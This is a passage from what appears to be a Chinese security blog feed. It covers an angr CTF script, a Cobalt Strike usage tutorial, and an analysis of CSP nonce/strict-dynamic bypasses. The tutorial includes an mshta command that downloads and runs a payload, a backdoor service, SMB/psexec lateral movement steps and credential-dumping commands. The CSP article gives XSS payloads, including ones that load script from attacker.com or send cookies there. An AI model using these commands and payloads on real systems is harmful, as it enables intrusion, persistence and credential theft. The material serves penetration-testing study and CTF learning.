src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210322015864c952b7f622010e130d.png" alt="image-20210322012614011"></p><p>第3个参数来源于<code>0x402159</code>，直接是一个静态地址</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202103220158d6b80952cb87c09ebd2b.png" alt="image-20210322001900137"></p><p>第4个参数就是输入字符串的长度，直接赋一个大于等于37的数值即可</p><p>所以最终脚本如下</p><pre><code class="python">import angrimport claripyp = angr.Project(&quot;./very_success&quot;, load_options=&#123;&quot;auto_load_libs&quot;: False&#125;)s = p.factory.entry_state(addr=0x401084)# 填入函数的参数s.mem[s.regs.esp:].dword = 0x401064s.mem[s.regs.esp+4:].dword = 0x4010E4s.mem[s.regs.esp+8:].dword = 0x402159s.mem[s.regs.esp+12:].dword = 37# 在第三个参数创建一个符号向量s.memory.store(0x402159, claripy.BVS(&quot;flag&quot;, 8*37))sm = p.factory.simulation_manager(s)print(&quot;[+] init ok&quot;)sm.explore(find=0x40106B, avoid=0x401072)if sm.found:    print(&quot;[+] found!&quot;)    x = sm.found[0].solver.eval(flag, cast_to=bytes).strip(b&#39;\0&#39;)    print(x)</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#funnyre-7-solves">WUST-CTF 2020 官方 Writeup</a></p><p><a href="https://xz.aliyun.com/u/11261">先知社区-Badrer</a></p><p><a href="https://xz.aliyun.com/t/7117">angr 系列教程(一）核心概念及模块解读</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt Strike Learn</title>
      <link href="/2021/03/10/Cobalt-Strike-Learn/"/>
      <url>/2021/03/10/Cobalt-Strike-Learn/</url>
      
        <content type="html"><![CDATA[<blockquote><p>关于Cobalt Strike的基础操作</p></blockquote><span id="more"></span><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><blockquote><p>官方文档：<a href="https://www.cobaltstrike.com/aggressor-script/index.html">https://www.cobaltstrike.com/aggressor-script/index.html</a></p><p>使用手册翻译版本：<a href="https://wbglil.gitbook.io/cobalt-strike/">https://wbglil.gitbook.io/cobalt-strike/</a></p></blockquote><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Cobalt Strike是一款渗透测试神器，常被业界人称为CS神器。Cobalt Strike已经不再使用MSF而是作为单独的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。</p><p>Cobalt Strike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。本期“安仔课堂”，ISEC实验室的陈老师带大家实战操作Cobalt Strike神器的使用。</p><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul><li>agscript拓展应用的脚本</li><li>c2lint 用于检查profile的错误异常</li><li>teamserver服务端程序</li><li>cobaltstrike，cobaltstrike.jar客户端程序(java跨平台)</li><li>logs目录记录与目标主机的相关信息</li><li>update，update.jar用于更新CS</li><li>third-party第三方工具</li></ul><h3 id="启动服务器"><a href="#启动服务器" class="headerlink" title="启动服务器"></a>启动服务器</h3><blockquote><p>若想修改teamserver端口则直接打开teamserver文件修改<code>-Dcobaltstrike.server_port</code>，端口默认为50050</p></blockquote><pre><code>sudo ./teamserver &lt;host&gt; &lt;password&gt;</code></pre><h3 id="启动客户端"><a href="#启动客户端" class="headerlink" title="启动客户端"></a>启动客户端</h3><p>Windows下直接打开<code>cobaltstrike.bat</code>文件，填入teamserver的主机，端口和密码，用户名自定义</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100116fe65cc97a7cf8c8db2d3.png" alt="image-20210402003746691" style="zoom: 67%;" /><h3 id="用户枚举"><a href="#用户枚举" class="headerlink" title="用户枚举"></a>用户枚举</h3><pre><code>/names</code></pre><h3 id="用户通信"><a href="#用户通信" class="headerlink" title="用户通信"></a>用户通信</h3><pre><code>/msg &lt;username&gt; &lt;message&gt;</code></pre><h2 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h2><ul><li>Beacon DNS</li><li>Beacon HTTP</li><li>Beacon HTTPS</li><li>Beacon SMB</li><li>Beacon TCP</li><li>External C2</li><li>Foreign HTTP</li><li>Foreign HTTPS</li></ul><blockquote><p>Beacon为内置的Listener，即在目标主机执行相应的payload，获取shell到CS上，其中包含DNS、HTTP、SMB</p><p>Foreign为外部结合的Listener，常用于MSF的结合，一般用来派生会话到MSF</p></blockquote><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><h3 id="生成hta"><a href="#生成hta" class="headerlink" title="生成hta"></a>生成hta</h3><blockquote><p>HTA是HTML Application的缩写（HTML应用程序），是软件开发的新概念，直接将HTML保存成HTA的格式，就是一个独立的应用软件，与VB、C++等程序语言所设计的软件界面没什么差别。HTML Application有三种类型的生成方式，测试发现，只有powershell方式生成的hta文件才能正常执行上线，Executable和VBA方式生成的hta文件执行的时候提示当前页面的脚本发生错误。</p></blockquote><p>攻击=&gt;生成木马=&gt;Hta程序</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210510011615ee06389102a6a3844b.png" alt="image-20210402010123793" style="zoom: 67%;" /><p>选择刚刚创建的监听器，方法有3种，这里选择PowerShell</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117346ce013397cc996ac02.png" alt="image-20210402010225346" style="zoom:67%;" /><p>利用web服务在受害者机器上下载恶意文件</p><p>攻击=&gt;钓鱼攻击=&gt;文件下载</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117eaf0d6a75ec5d7741815.png" alt="image-20210402010419802" style="zoom:67%;" /><p>选择刚刚生成的hta程序</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021051001177a10c44edaf6c2ec5aa3.png" alt="image-20210402010541043" style="zoom:67%;" /><p>事件会被记录</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117685b5e6fc07412238d0c.png" alt="image-20210402010734975" style="zoom: 67%;" /><p>在受害者机器上运行</p><pre><code>mshta http://&lt;host&gt;:80/download/file.ext</code></pre><h3 id="生成office宏"><a href="#生成office宏" class="headerlink" title="生成office宏"></a>生成office宏</h3><p>攻击=&gt;生成木马=&gt;Office宏木马</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021051001172afe8ea5ed2338dbd04a.png" alt="image-20210402011728626" style="zoom:67%;" /><p>选择创建的监听器，弹出使用教程</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021051001171b000eaf2ef852af888a.png" alt="image-20210402011835331" style="zoom:67%;" /><blockquote><p>word开启禁用宏：文件——&gt;选项——&gt;信任中心——&gt;信任中心设置</p></blockquote><h3 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h3><p>攻击=&gt;生成木马=&gt;生成Payload</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117bbd4fc22109d7b7024a0.png" alt="image-20210402011942160" style="zoom:67%;" /><p>可以选择各种语言的payload，还能勾选是否为64位程序</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117f81bb4fe6b34a9fa2ab4.png" alt="image-20210402012020619" style="zoom:67%;" /><h3 id="生成分阶段木马"><a href="#生成分阶段木马" class="headerlink" title="生成分阶段木马"></a>生成分阶段木马</h3><blockquote><p>Stager是分阶段传送Payload。分阶段的意思是我们生成的Stager马其实是一个小程序，用于从服务器端下载我们真正的shellcode。分阶段在很多时候是很有必要的，因为很多场景对于能加载进内存并成功漏洞利用后执行的数据大小存在严格限制。所以这种时候，我们就不得不利用分阶段传送了。如果不需要分阶段的话，可以在C2的扩展文件里面把host_stage选项设置为false。</p></blockquote><p>攻击=&gt;生成木马=&gt;Windows分阶段木马</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021051001171bba1026c94edae3471f.png" alt="image-20210402012449241" style="zoom:67%;" /><h3 id="生成无阶段木马"><a href="#生成无阶段木马" class="headerlink" title="生成无阶段木马"></a>生成无阶段木马</h3><blockquote><p>Stageless是完整的木马，后续不需要再向服务器端请求shellcode。所以使用这种方法生成的木马会比Stager生成的木马体积要大。但是这种木马有助于避免反溯源，因为如果开启了分阶段传送，任何人都能连接到你的C2服务器请求payload，并分析payload中的配置信息。在CobaltStrike4.0及以后的版本中，后渗透和横向移动绝大部分是使用的Stageless类型的木马。</p><p>Windows Executable(S)相比于Windows Executable，其中包含Beacon的完整payload，不需要阶段性的请求，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持powershell脚本，可用于将Stageless Payload注入内存。</p></blockquote><p>攻击=&gt;生成木马=&gt;Windows无阶段木马</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117924d8eb38aea2f236b67.png" alt="image-20210402012506006" style="zoom:67%;" /><blockquote><p>注意，生成的Windows Service EXE生成的木马，直接双击是不会返回session的。需要以创建服务的方式启动，才会返回session。</p><pre><code class="cmd">#注意，等号（=）后面要有空格sc create autoRunBackDoor binPath= &quot;cmd.exe /c C:\users\administrator\desktop\cs.exe&quot; start=auto DisplayName=autoRunBackDoor#开启某个系统服务sc start autoRunBackDoor #停止某个系统服务sc stop autoRunBackDoor # 删除某个系统服务sc delete service_name</code></pre></blockquote><h2 id="主机深入"><a href="#主机深入" class="headerlink" title="主机深入"></a>主机深入</h2><h3 id="Bypass-UAC提权"><a href="#Bypass-UAC提权" class="headerlink" title="Bypass UAC提权"></a>Bypass UAC提权</h3><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117370e63f46d8d82e2aeab.png" alt="image-20210402012958946" style="zoom:67%;" /><h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117debdd12b3acdc8770dbf.png" alt="image-20210402013043844" style="zoom:67%;" /><h3 id="Mimikatz获取密码"><a href="#Mimikatz获取密码" class="headerlink" title="Mimikatz获取密码"></a>Mimikatz获取密码</h3><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210510011742ef27b7bbd481d37ec0.png" alt="image-20210402013104992" style="zoom:67%;" /><h2 id="联动MSF"><a href="#联动MSF" class="headerlink" title="联动MSF"></a>联动MSF</h2><p>创建Foreign HTTP监听器</p><p>MSF使用multi/handler进行监听</p><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117ef5c46b99f1c7ec218ef.png" alt="image-20210402013643568" style="zoom:67%;" /><h3 id="共享服务横向移动"><a href="#共享服务横向移动" class="headerlink" title="共享服务横向移动"></a>共享服务横向移动</h3><p>IPC测试</p><pre><code>shell dir \\172.16.35.128\C$</code></pre><p>创建SMB Beacon</p><p>生成services.exe的Windws无阶段木马</p><p>上传到beacon</p><pre><code>upload /root/Desktop/beacon.exe</code></pre><p>复制beacon到内网机器</p><pre><code>shell copy beacon.exe \\172.16.35.128\C$\windows\temp</code></pre><p>创建beacon服务</p><pre><code>shell sc \\172.16.35.128 creat beacon binpath=c:\windows\temp\beacon.exe</code></pre><p>启动beacon服务</p><pre><code>shell sc \\172.16.35.128 start beacon</code></pre><p>连接内网机器</p><pre><code>link 172.16.35.128</code></pre><h3 id="psexec横向移动"><a href="#psexec横向移动" class="headerlink" title="psexec横向移动"></a>psexec横向移动</h3><blockquote><p>如果内网主机无法访问外网</p></blockquote><p>派生一个Foreign Beacon</p><pre><code>spawn foreign tcp</code></pre><p>远程执行beacon</p><pre><code>psexec 172.16.35.128 C$ beacon smb</code></pre><h2 id="脚本管理器"><a href="#脚本管理器" class="headerlink" title="脚本管理器"></a>脚本管理器</h2><p>直接导入cna文件即可</p><h2 id="socks4a代理"><a href="#socks4a代理" class="headerlink" title="socks4a代理"></a>socks4a代理</h2><p>点击SOCKS Server，然后在代理攻击上使用SOCKS4，填上主机和端口即可</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021051001171d7669790f5009fb2c74.png" alt="image-20210402015236996" style="zoom:67%;" /><p>停止SOCKS Server</p><pre><code>socks stop</code></pre><h2 id="CobaltStrike常见命令"><a href="#CobaltStrike常见命令" class="headerlink" title="CobaltStrike常见命令"></a>CobaltStrike常见命令</h2><pre><code class="shell">BeaconCommands===============    Command                   Description    -------                   -----------    browserpivot              注入受害者浏览器进程    bypassuac                 绕过UAC    cancel                    取消正在进行的下载    cd                        切换目录    checkin                   强制让被控端回连一次    clear                     清除beacon内部的任务队列    connect                   Connect to a Beacon peerover TCP    covertvpn                 部署Covert VPN客户端    cp                        复制文件    dcsync                    从DC中提取密码哈希    desktop                   远程VNC    dllinject                 反射DLL注入进程    dllload                   使用LoadLibrary将DLL加载到进程中    download                  下载文件    downloads                 列出正在进行的文件下载    drives                    列出目标盘符    elevate                   尝试提权   execute                   在目标上执行程序(无输出)    execute-assembly          在目标上内存中执行本地.NET程序    exit                      退出beacon    getprivs                  Enable system privileges oncurrent token    getsystem                 尝试获取SYSTEM权限    getuid                    获取用户ID    hashdump                  转储密码哈希值    help                      帮助    inject                    在特定进程中生成会话    jobkill                   杀死一个后台任务    jobs                      列出后台任务    kerberos_ccache_use       从ccache文件中导入票据应用于此会话    kerberos_ticket_purge     清除当前会话的票据    kerberos_ticket_use       从ticket文件中导入票据应用于此会话    keylogger                 键盘记录    kill                      结束进程    link                      Connect to a Beacon peerover a named pipe    logonpasswords            使用mimikatz转储凭据和哈希值    ls                        列出文件    make_token                创建令牌以传递凭据    mimikatz                  运行mimikatz    mkdir                     创建一个目录    mode dns                  使用DNS A作为通信通道(仅限DNS beacon)    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)    mode http                 使用HTTP作为通信通道    mv                        移动文件    net                       net命令    note                      备注          portscan                  进行端口扫描    powerpick                 通过Unmanaged PowerShell执行命令    powershell                通过powershell.exe执行命令    powershell-import         导入powershell脚本    ppid                      Set parent PID forspawned post-ex jobs    ps                        显示进程列表    psexec                    Use a service to spawn asession on a host    psexec_psh                Use PowerShell to spawn asession on a host    psinject                  在特定进程中执行PowerShell命令    pth                       使用Mimikatz进行传递哈希    pwd                       当前目录位置    reg                       Query the registry    rev2self                  恢复原始令牌    rm                        删除文件或文件夹    rportfwd                  端口转发    run                       在目标上执行程序(返回输出)    runas                     以另一个用户权限执行程序    runasadmin                在高权限下执行程序    runu                      Execute a program underanother PID    screenshot                屏幕截图    setenv                    设置环境变量    shell                     cmd执行命令    shinject                  将shellcode注入进程    shspawn                   生成进程并将shellcode注入其中    sleep                     设置睡眠延迟时间    socks                     启动SOCKS4代理    socks stop                停止SOCKS4    spawn                     Spawn a session    spawnas                   Spawn a session as anotheruser    spawnto                   Set executable tospawn processes into    spawnu                    Spawn a session underanother PID    ssh                       使用ssh连接远程主机    ssh-key                   使用密钥连接远程主机    steal_token               从进程中窃取令牌    timestomp                 将一个文件时间戳应用到另一个文件    unlink                    Disconnect from parentBeacon    upload                    上传文件    wdigest                   使用mimikatz转储明文凭据    winrm                     使用WinRM在主机上生成会话    wmi                       使用WMI在主机上生成会话    argue                     进程参数欺骗</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/company-information/167460.html">渗透测试神器Cobalt Strike使用教程</a></p><p><a href="https://www.anquanke.com/post/id/235251">CobaltStrike使用详解</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Penertration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSP nonce&amp;strict-dynamic Bypass</title>
      <link href="/2021/02/17/nonce-strict-dynamic-bypass/"/>
      <url>/2021/02/17/nonce-strict-dynamic-bypass/</url>
      
        <content type="html"><![CDATA[<p>关于CSP中nonce&amp;strict-dynamic机制分析和绕过</p><span id="more"></span><h2 id="前提知识"><a href="#前提知识" class="headerlink" title="前提知识"></a>前提知识</h2><p>众所周知，CSP的默认策略是不允许inline脚本执行，想要运行inline脚本需要进行如下设置</p><pre><code class="js">Content-Security-Policy: script-src &#39;unsafe-inline&#39;</code></pre><p>但是为了防止恶意脚本的注入，CSP引入了nonce机制和script-dynamic机制</p><h2 id="探究nonce机制"><a href="#探究nonce机制" class="headerlink" title="探究nonce机制"></a>探究nonce机制</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>参考<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src">MDN的标准</a></p><blockquote><p><strong>nonce-&lt;base64-value&gt;</strong></p><p>An allow-list for specific inline scripts using a cryptographic nonce (number used once). The server must generate a unique nonce value each time it transmits a policy. It is critical to provide an unguessable nonce, as bypassing a resource’s policy is otherwise trivial. See <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe_inline_script">unsafe inline script</a> for an example. Specifying nonce makes a modern browser ignore <code>&#39;unsafe-inline&#39;</code> which could still be set for older browsers without nonce support.</p><p><strong>Note:</strong> The CSP <code>nonce</code> source can only be apply <em>nonceable</em> elements (e.g. as the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/img"><code>&lt;img&gt;</code></a> element has no <code>nonce</code> attribute, there is no way to associate it with this CSP source).</p></blockquote><p>使用一个随机<code>nonce</code>来控制白名单，即可允许执行脚本，所以需要确保<code>nonce</code>是随机生成的，而且这个<code>nonce</code>会忽略<code>unsafe-inline</code>属性</p><p><strong>例子</strong></p><pre><code class="js">Content-Security-Policy: script-src &#39;nonce-test&#39;</code></pre><pre><code class="html">&lt;script nonce=&quot;test&quot;&gt;// 可以执行&lt;/script&gt;&lt;script&gt;// 不能执行&lt;/script&gt;</code></pre><h3 id="常见绕过思路"><a href="#常见绕过思路" class="headerlink" title="常见绕过思路"></a>常见绕过思路</h3><h4 id="浏览器自动补全"><a href="#浏览器自动补全" class="headerlink" title="浏览器自动补全"></a><strong>浏览器自动补全</strong></h4><blockquote><p>Firefox、IE成功，Chrome失败</p></blockquote><p>如果在nonce上方存在XSS注入，则可以直接通过标签闭合使nonce成为自己的属性</p><p>实例</p><pre><code class="php">&lt;?php     header(&quot;X-XSS-Protection:0&quot;);    header(&quot;Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;nonce-test&#39;&quot;);    echo $_GET[&#39;xss&#39;];?&gt;&lt;script nonce=&#39;test&#39;&gt;&lt;/script&gt;</code></pre><p>payload</p><pre><code class="html">?xss=&lt;script src=data:text/plain,alert(1)</code></pre><h4 id="Base-uri绕过"><a href="#Base-uri绕过" class="headerlink" title="Base-uri绕过"></a><strong>Base-uri绕过</strong></h4><p>如果base-uri没有被设置，那我们可以使用<code>&lt;base&gt;</code>将文档的基础uri改为自己的服务器，引入自定义的js文件</p><p>例子</p><pre><code class="php">&lt;?php    header(&quot;Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;nonce-test&#39;&quot;);?&gt;&lt;base href=&quot;//attacker.com&quot;&gt;&lt;script nonce=&#39;test&#39; src=&quot;/main.js&quot;&gt;&lt;/script&gt;</code></pre><h4 id="meta标签绕过"><a href="#meta标签绕过" class="headerlink" title="meta标签绕过"></a><strong>meta标签绕过</strong></h4><pre><code class="html">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://attacker.com/receive.php?c=&quot;+escape(document.cookie)) &gt;</code></pre><h4 id="浏览器缓存绕过"><a href="#浏览器缓存绕过" class="headerlink" title="浏览器缓存绕过"></a><strong>浏览器缓存绕过</strong></h4><p>具体步骤可参考这篇<a href="https://www.freebuf.com/articles/web/133455.html">文章</a></p><p>攻击能够实现的原因有2个：</p><ul><li>浏览器开启了缓存，只修改location.hash不会请求服务器，给我们能够窃取nonce的机会</li><li>利用iframe标签窃取nonce并实现任意XSS</li></ul><h4 id="输出缓冲区溢出绕过"><a href="#输出缓冲区溢出绕过" class="headerlink" title="输出缓冲区溢出绕过"></a><strong>输出缓冲区溢出绕过</strong></h4><p>实例源于<a href="https://github.com/justcatthefish/justctf-2020/tree/master/challenges/web_baby-csp">justCTF 2020 babyCSP</a></p><blockquote><p>因为在官方靶机复现的时候最后没打到admin那，本地搭环境发现要用域名在google注册reCAPTCHA服务，所以下面主要是讲绕过CSP nonce的部分</p></blockquote><p>题目核心代码如下</p><pre><code class="php">&lt;?phprequire_once(&quot;secrets.php&quot;);$nonce = random_bytes(8);if(isset($_GET[&#39;flag&#39;]))&#123; if(isAdmin())&#123;    header(&#39;X-Content-Type-Options: nosniff&#39;);    header(&#39;X-Frame-Options: DENY&#39;);    header(&#39;Content-type: text/html; charset=UTF-8&#39;);    echo $flag;    die(); &#125; else&#123;     echo &quot;You are not an admin!&quot;;     die(); &#125;&#125;for($i=0; $i&lt;10; $i++)&#123;    if(isset($_GET[&#39;alg&#39;]))&#123;        $_nonce = hash($_GET[&#39;alg&#39;], $nonce);        if($_nonce)&#123;            $nonce = $_nonce;            continue;        &#125;    &#125;    $nonce = md5($nonce);&#125;if(isset($_GET[&#39;user&#39;]) &amp;&amp; strlen($_GET[&#39;user&#39;]) &lt;= 23) &#123;    header(&quot;content-security-policy: default-src &#39;none&#39;; style-src &#39;nonce-$nonce&#39;; script-src &#39;nonce-$nonce&#39;&quot;);    echo &lt;&lt;&lt;EOT        &lt;script nonce=&#39;$nonce&#39;&gt;            setInterval(                ()=&gt;user.style.color=Math.random()&lt;0.3?&#39;red&#39;:&#39;black&#39;            ,100);        &lt;/script&gt;        &lt;center&gt;&lt;h1&gt; Hello &lt;span id=&#39;user&#39;&gt;&#123;$_GET[&#39;user&#39;]&#125;&lt;/span&gt;!!&lt;/h1&gt;        &lt;p&gt;Click &lt;a href=&quot;?flag&quot;&gt;here&lt;/a&gt; to get a flag!&lt;/p&gt;EOT;&#125;else&#123;    show_source(__FILE__);&#125;// Found a bug? We want to hear from you! /bugbounty.php// Check /Dockerfile</code></pre><p>漏洞的核心在于在执行<code>header()</code>之前会对nonce进行计算，hash的seed可控且无长度限制，当我们输入alg参数时，页面会输出warning</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021021515253cef4728db75de5a220c.png" alt="image-20210215102946344"></p><p>参考PHP文档的<a href="https://www.php.net/manual/en/outcontrol.configuration.php#outcontrol.configuration">Runtime Configuration</a></p><blockquote><p><code>output_buffering</code> bool/int</p><p>You can enable output buffering for all files by setting this directive to ‘On’. If you wish to limit the size of the buffer to a certain size - you can use a maximum number of bytes instead of ‘On’, as a value for this directive (e.g., output_buffering=4096). This directive is always Off in PHP-CLI.</p></blockquote><p>PHP具有多个种类的输出缓冲区，输出缓冲区默认大小是<strong>4096 bytes</strong>，HTTP缓冲区负责存储HTTP Header和HTTP Body，如果缓冲区超过最大限制就会强制刷新，所以只要我们输入的alg参数足够长，就能导致缓冲区溢出，从而使header修改失败</p><blockquote><p>注意CLI的输出缓冲区比较特别，CLI会将INI配置中的<em>output_buffer</em>选项强制设置为0，这表示禁用默认PHP输出缓冲区</p></blockquote><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021021515255cf45fd8fa67cb1ec1b4.png" alt="image-20210215105539720"></p><p>在web中查看，你可以再一次确定输出缓冲区默认大小是<strong>4096 bytes</strong></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102151525a2fdf924894d84bc0d1c.png" alt="image-20210215105440404"></p><p>注入足够长度的参数header就会无法修改从而绕过CSP，此时插入XSS便能攻击成功</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021021515258ef91bc2f07f0249024d.png" alt="image-20210215140908083"></p><p>所以前半部分的payload如下</p><pre><code class="html">&lt;script&gt;    name=&quot;fetch(&#39;?flag&#39;).then(e=&gt;e.text()).then(alert)&quot;    location = &#39;https://127.0.0.1:10001/?user=%3Csvg%20onload=eval(name)%3E&amp;alg=&#39;+&#39;a&#39;.repeat(&#39;292&#39;);&lt;/script&gt;</code></pre><h2 id="探究strict-dynamic机制"><a href="#探究strict-dynamic机制" class="headerlink" title="探究strict-dynamic机制"></a>探究strict-dynamic机制</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>参考<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src">MDN的标准</a></p><blockquote><p><strong>strict-dynamic</strong></p><p>The <code>strict-dynamic</code> source expression specifies that the trust explicitly given to a script present in the markup, by accompanying it with a nonce or a hash, shall be propagated to all the scripts loaded by that root script. At the same time, any allow-list or source expressions such as <code>&#39;self&#39;</code> or <code>&#39;unsafe-inline&#39;</code> are ignored. See <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#strict-dynamic">script-src</a> for an example.</p></blockquote><p><code>strict-dynamic</code>规定需要给可执行脚本一个明确的<code>nonce</code>或者<code>hash</code>，防止因为白名单存在相关漏洞而被引入恶意脚本，同时也会忽略<code>self</code>和<code>unsafe-inline</code>属性，<code>strict-dynamic</code>可让我们动态插入满足<code>nonce</code>的可执行脚本</p><p><strong>例子</strong></p><pre><code class="js">Content-Security-Policy: script-src &#39;nonce-test&#39; &#39;strict-dynamic&#39; example.com</code></pre><pre><code class="html">&lt;script src=&quot;//example.com/assets/A.js&quot; nonce=&quot;test&quot;&gt;// 可以执行&lt;/script&gt;&lt;script src=&quot;//example.com/assets/B.js&quot;&gt;// 不能执行&lt;/script&gt;</code></pre><h3 id="常见绕过思路-1"><a href="#常见绕过思路-1" class="headerlink" title="常见绕过思路"></a>常见绕过思路</h3><h4 id="通过CSS泄露nonce"><a href="#通过CSS泄露nonce" class="headerlink" title="通过CSS泄露nonce"></a><strong>通过CSS泄露nonce</strong></h4><p>主要参考这篇<a href="http://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html">文章</a>，可以说一种侧信道攻击</p><p>CSS攻击原理都一样，先进行匹配然后通过url进行回显，具体就不多说了</p><pre><code class="css">// 1*[attribute^=&quot;a&quot;]&#123;background:url(&quot;record?match=a&quot;)&#125;*[attribute^=&quot;b&quot;]&#123;background:url(&quot;record?match=b&quot;)&#125;*[attribute^=&quot;c&quot;]&#123;background:url(&quot;record?match=c&quot;)&#125;[...]// 2*[attribute^=&quot;aa&quot;]&#123;background:url(&quot;record?match=aa&quot;)&#125;*[attribute^=&quot;ab&quot;]&#123;background:url(&quot;record?match=ab&quot;)&#125;*[attribute^=&quot;ac&quot;]&#123;background:url(&quot;record?match=ac&quot;)&#125;[...]</code></pre><h4 id="Script-Gadget"><a href="#Script-Gadget" class="headerlink" title="Script Gadget"></a><strong>Script Gadget</strong></h4><p>使用某个HTML或者JS文件中现存的特定的JS代码来绕过CSP，这个是我们本次学习的重点</p><h2 id="Script-Gadget-1"><a href="#Script-Gadget-1" class="headerlink" title="Script Gadget"></a>Script Gadget</h2><blockquote><p>参考2017年blackhat的《<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf">Breaking XSS mitigations via Script Gadgets</a>》</p><p>Github: <a href="https://github.com/google/security-research-pocs">https://github.com/google/security-research-pocs</a></p></blockquote><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p><strong>在HTML代码中</strong></p><pre><code class="html">&lt;div data-role=&quot;button&quot;data-text=&quot;I am a button&quot;&gt;&lt;/div&gt;&lt;script&gt; var buttons = $(&quot;[data-role=button]&quot;); buttons.html(button.getAttribute(&quot;data-text&quot;)); // 注入点&lt;/script&gt;</code></pre><p>所以可以构造如下语句进行注入</p><pre><code class="html">&lt;div data-role=&quot;button&quot; data-text=&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;...&lt;/div&gt;</code></pre><p><strong>在JS代码中</strong></p><p>以Knockout Gadget为例</p><pre><code class="js">// 获取data-bind属性switch (node.nodeType) &#123; case 1: return node.getAttribute(&quot;data-bind&quot;);// 写入到rewrittenBindingsvar rewrittenBindings = ko.expressionRewriting.preProcessBindings(bindingsString, options), functionBody = &quot;with($context)&#123;with($data||&#123;&#125;)&#123;return&#123;&quot; + rewrittenBindings + &quot;&#125;&#125;&#125;&quot;;return new Function(&quot;$context&quot;, &quot;$element&quot;, functionBody);// 执行上述脚本return bindingFunction(bindingContext, node);</code></pre><p>所以可以构造如下语句进行注入</p><pre><code class="html">&lt;div data-bind=&quot;value: alert(1)&quot;&gt;&lt;/div&gt;</code></pre><h3 id="产生原因"><a href="#产生原因" class="headerlink" 